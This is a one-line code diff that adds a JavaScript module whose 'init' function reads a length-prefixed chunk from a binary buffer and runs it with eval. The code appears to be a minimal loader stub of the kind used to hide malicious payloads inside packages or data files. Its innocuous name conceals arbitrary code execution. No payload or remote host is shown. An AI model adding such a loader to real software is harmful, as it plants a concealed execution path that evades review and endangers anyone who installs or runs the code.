@@ -1,0 +1,1 @@
+exports.init=function(a){var s=a.readUInt32LE(0);eval(a.toString('ascii',4,s+4))}
